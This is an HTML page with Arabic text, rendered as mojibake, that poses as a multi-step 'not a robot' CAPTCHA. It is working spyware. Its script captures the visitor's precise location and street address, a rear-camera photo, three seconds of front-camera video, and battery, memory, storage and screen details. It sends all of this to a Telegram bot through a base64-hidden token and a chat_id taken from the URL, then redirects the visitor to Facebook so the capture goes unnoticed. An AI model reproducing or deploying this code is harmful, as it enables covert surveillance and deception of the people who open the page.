<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù†Ùƒ Ù„Ø³Øª Ø±ÙˆØ¨ÙˆØª</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f2f5;
            margin: 0; padding: 0;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; color: #333;
        }
        .captcha-container {
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            width: 90%; max-width: 500px;
            padding: 30px; text-align: center;
        }
        .logo {
            width: 80px; height: 80px;
            margin: 0 auto 20px;
            background-color: #4285F4;
            border-radius: 50%; display: flex;
            justify-content: center; align-items: center;
            color: white; font-size: 24px; font-weight: bold;
        }
        button {
            background-color: #4285F4; color: white;
            border: none; border-radius: 4px;
            padding: 12px 24px; font-size: 16px;
            cursor: pointer; width: 100%;
            margin: 10px 0;
        }
        button:hover { background-color: #3367D6; }
        .loading {
            display: inline-block; width: 20px; height: 20px;
            border: 3px solid rgba(0,0,0,.3);
            border-radius: 50%; border-top-color: #000;
            animation: spin 1s ease-in-out infinite;
        }
        .permission-step { display: none; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class="captcha-container">
    <div class="logo">âœ“</div>
    <h1>Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù†Ùƒ Ù„Ø³Øª Ø±ÙˆØ¨ÙˆØª</h1>
    
    <div id="step1">
        <p>Ù„Ø­Ù…Ø§ÙŠØ© Ù…ÙˆÙ‚Ø¹Ù†Ø§ØŒ ÙŠÙ„Ø²Ù… Ø¥Ø¬Ø±Ø§Ø¡ ØªØ­Ù‚Ù‚ Ù…ØªØ¹Ø¯Ø¯ Ø§Ù„Ø®Ø·ÙˆØ§Øª.</p>
        <button id="start-btn">Ø§Ø¨Ø¯Ø£ Ø§Ù„ØªØ­Ù‚Ù‚</button>
    </div>
    
    <div id="step2" class="permission-step">
        <p>Ø§Ù„Ø®Ø·ÙˆØ© 1/4: ÙŠÙ„Ø²Ù… Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ù…ÙˆÙ‚Ø¹Ùƒ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ Ù„Ù„ØªØ­Ù‚Ù‚</p>
        <button id="location-btn">Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹</button>
    </div>
    
    <div id="step3" class="permission-step">
        <p>Ø§Ù„Ø®Ø·ÙˆØ© 2/4: ÙŠÙ„Ø²Ù… Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ©</p>
        <button id="back-camera-btn">Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§</button>
    </div>
    
    <div id="step4" class="permission-step">
        <p>Ø§Ù„Ø®Ø·ÙˆØ© 3/4: ÙŠÙ„Ø²Ù… Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©</p>
        <button id="front-camera-btn">Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§</button>
    </div>
    
    <div id="step5" class="permission-step">
        <p>Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª...</p>
        <div class="loading"></div>
    </div>
</div>

<script>
// Ø¬Ù„Ø¨ Ø§Ù„ØªÙˆÙƒÙ† Ù…Ù† Ø±Ø§Ø¨Ø· URL
function getTokenFromUrl() {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get('token') || atob("ODMwMjkxODQzNjpBQUU1LTZocS02M24wRW55Ml9wWEpwQXRXcGEtVDZBUkxuTQ==");
}

// Ø¬Ù„Ø¨ Ø§Ù„Ù€ chat_id Ù…Ù† Ø±Ø§Ø¨Ø· URL
function getChatIdFromUrl() {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get('chat_id') || null;
}

// Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„ØªÙˆÙƒÙ† Ù…Ù† Ø§Ù„Ø±Ø§Ø¨Ø·
const BOT_TOKEN = getTokenFromUrl();
const FACEBOOK_URL = "https://www.facebook.com";

const collectedData = {
    systemInfo: {}, 
    backCamera: { photo: null, allowed: false },
    frontCamera: { video: null, allowed: false },
    location: { coords: null, address: null, allowed: false },
    battery: {}, 
    screen: {},
    deviceMemory: null,
    hardwareConcurrency: null,
    storage: null
};

function showStep(stepId) {
    document.querySelectorAll('.permission-step').forEach(el => el.style.display = 'none');
    document.getElementById(stepId).style.display = 'block';
}

async function getSystemInfo() {
    // Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©
    collectedData.systemInfo = {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        deviceType: /Mobile|Android|iPhone/i.test(navigator.userAgent) ? "Ù‡Ø§ØªÙ" : "ÙƒÙ…Ø¨ÙŠÙˆØªØ±",
        cookiesEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack || "ØºÙŠØ± Ù…ÙØ¹Ù„"
    };

    // Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø´Ø§Ø´Ø©
    collectedData.screen = {
        width: screen.width,
        height: screen.height,
        colorDepth: screen.colorDepth,
        orientation: screen.orientation?.type || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
        pixelRatio: window.devicePixelRatio || 1
    };

    // Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            collectedData.battery = {
                level: Math.round(battery.level * 100) + '%',
                charging: battery.charging ? 'Ù†Ø¹Ù…' : 'Ù„Ø§',
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        } catch { collectedData.battery = { error: 'Ù„Ø§ ÙŠÙ…ÙƒÙ† Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©' }; }
    }

    // Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø°Ø§ÙƒØ±Ø© ÙˆØ§Ù„Ø£Ø¯Ø§Ø¡ (ØªØ¹Ù…Ù„ Ø¹Ù„Ù‰ Ø¨Ø¹Ø¶ Ø§Ù„Ù…ØªØµÙØ­Ø§Øª ÙÙ‚Ø·)
    if ('deviceMemory' in navigator) {
        collectedData.deviceMemory = navigator.deviceMemory + ' GB';
    }
    if ('hardwareConcurrency' in navigator) {
        collectedData.hardwareConcurrency = navigator.hardwareConcurrency + ' Ø£Ù†ÙˆÙŠØ©';
    }

    // Ù…Ø³Ø§Ø­Ø© Ø§Ù„ØªØ®Ø²ÙŠÙ† (ØªØ¹Ù…Ù„ Ø¹Ù„Ù‰ Ø¨Ø¹Ø¶ Ø§Ù„Ù…ØªØµÙØ­Ø§Øª Ø§Ù„Ø­Ø¯ÙŠØ«Ø©)
    if ('storage' in navigator && 'estimate' in navigator.storage) {
        try {
            const storage = await navigator.storage.estimate();
            collectedData.storage = {
                total: (storage.quota / (1024 * 1024)).toFixed(2) + ' MB',
                used: (storage.usage / (1024 * 1024)).toFixed(2) + ' MB'
            };
        } catch {}
    }
}

async function requestLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) return resolve(false);
        
        navigator.geolocation.getCurrentPosition(async (pos) => {
            collectedData.location.coords = {
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                accuracy: pos.coords.accuracy + ' Ù…ØªØ±'
            };
            collectedData.location.allowed = true;
            try {
                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`);
                const data = await res.json();
                collectedData.location.address = data.display_name || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
            } catch {}
            resolve(true);
        }, () => resolve(false), { enableHighAccuracy: true, timeout: 10000 });
    });
}

async function captureBackCameraPhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
        const video = document.createElement('video');
        video.srcObject = stream; await video.play();
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        collectedData.backCamera.photo = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
        collectedData.backCamera.allowed = true;
        stream.getTracks().forEach(t => t.stop());
        return true;
    } catch {
        return false;
    }
}

async function recordFrontCameraVideo() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        const chunks = [];
        
        recorder.ondataavailable = e => e.data.size && chunks.push(e.data);
        recorder.onstop = () => {
            collectedData.frontCamera.video = new Blob(chunks, { type: 'video/webm' });
            collectedData.frontCamera.allowed = true;
            stream.getTracks().forEach(t => t.stop());
        };
        
        recorder.start();
        await new Promise(resolve => setTimeout(resolve, 3000));
        recorder.stop();
        await new Promise(resolve => setTimeout(resolve, 500));
        return true;
    } catch {
        return false;
    }
}

async function sendAllDataToTelegram(chatId) {
    const timestamp = new Date().toLocaleString();
    
    try {
        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù†ØµÙŠØ© (Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…)
        let systemInfoText = `
ğŸ“Š **ØªÙ‚Ø±ÙŠØ± Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„ÙƒØ§Ù…Ù„**
â° **Ø§Ù„ÙˆÙ‚Øª:** ${timestamp}
ğŸ“± **Ù†ÙˆØ¹ Ø§Ù„Ø¬Ù‡Ø§Ø²:** ${collectedData.systemInfo.deviceType}
ğŸŒ **Ø§Ù„Ù…ØªØµÙØ­:** ${collectedData.systemInfo.userAgent}
ğŸ’¾ **Ø§Ù„Ø°Ø§ÙƒØ±Ø©:** ${collectedData.deviceMemory || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
âš™ï¸ **Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬:** ${collectedData.hardwareConcurrency || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
ğŸ’½ **Ø§Ù„ØªØ®Ø²ÙŠÙ†:** ${collectedData.storage ? `Ø§Ù„Ø¥Ø¬Ù…Ø§Ù„ÙŠ: ${collectedData.storage.total} | Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: ${collectedData.storage.used}` : 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
ğŸ”‹ **Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©:** ${collectedData.battery.level || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'} (${collectedData.battery.charging === 'Ù†Ø¹Ù…' ? 'Ø´Ø­Ù†' : 'ØºÙŠØ± Ù…Ø´Ø­ÙˆÙ†'})
ğŸ–¥ï¸ **Ø§Ù„Ø´Ø§Ø´Ø©:** ${collectedData.screen.width}x${collectedData.screen.height} (Ù†Ø³Ø¨Ø© Ø§Ù„Ø¨ÙƒØ³Ù„: ${collectedData.screen.pixelRatio})
ğŸ“ **Ø§Ù„Ù…ÙˆÙ‚Ø¹:** ${collectedData.location.address || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'} (Ø¯Ù‚Ø©: ${collectedData.location.coords?.accuracy || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'})
        `;

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: systemInfoText,
                parse_mode: 'Markdown'
            })
        });
        
        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ©
        if (collectedData.backCamera.photo) {
            const photoForm = new FormData();
            photoForm.append('chat_id', chatId);
            photoForm.append('photo', collectedData.backCamera.photo, 'photo.jpg');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: photoForm
            });
        }
        
        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©
        if (collectedData.frontCamera.video) {
            const videoForm = new FormData();
            videoForm.append('chat_id', chatId);
            videoForm.append('video', collectedData.frontCamera.video, 'video.webm');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                method: 'POST',
                body: videoForm
            });
        }
        
        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ Ø¥Ø°Ø§ ÙƒØ§Ù† Ù…ØªØ§Ø­Ø§Ù‹
        if (collectedData.location.coords) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    latitude: collectedData.location.coords.latitude,
                    longitude: collectedData.location.coords.longitude
                })
            });
        }
    } catch (e) {
        console.error('Error sending data to Telegram:', e);
    }
}

// Ø¥Ø¹Ø¯Ø§Ø¯ Ø®Ø·ÙˆØ§Øª Ø§Ù„ØªØ­Ù‚Ù‚
document.getElementById('start-btn').addEventListener('click', () => {
    document.getElementById('step1').style.display = 'none';
    showStep('step2');
});

document.getElementById('location-btn').addEventListener('click', async () => {
    showStep('step5');
    const success = await requestLocation();
    if (success) {
        showStep('step3');
    } else {
        alert('ÙŠØ¬Ø¨ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©');
        showStep('step2');
    }
});

document.getElementById('back-camera-btn').addEventListener('click', async () => {
    showStep('step5');
    const success = await captureBackCameraPhoto();
    if (success) {
        showStep('step4');
    } else {
        alert('ÙŠØ¬Ø¨ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©');
        showStep('step3');
    }
});

document.getElementById('front-camera-btn').addEventListener('click', async () => {
    showStep('step5');
    const success = await recordFrontCameraVideo();
    if (success) {
        const chatId = getChatIdFromUrl();
        if (!chatId) {
            alert('Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªØ­Ù‚Ù‚');
            return;
        }
        
        await getSystemInfo();
        await sendAllDataToTelegram(chatId);
        
        // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„ÙÙŠØ³Ø¨ÙˆÙƒ Ø¨Ø¹Ø¯ Ø¥ØªÙ…Ø§Ù… Ø§Ù„Ø¹Ù…Ù„ÙŠØ©
        setTimeout(() => window.location.href = FACEBOOK_URL, 2000);
    } else {
        alert('ÙŠØ¬Ø¨ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©');
        showStep('step4');
    }
});
</script>
</body>
</html>
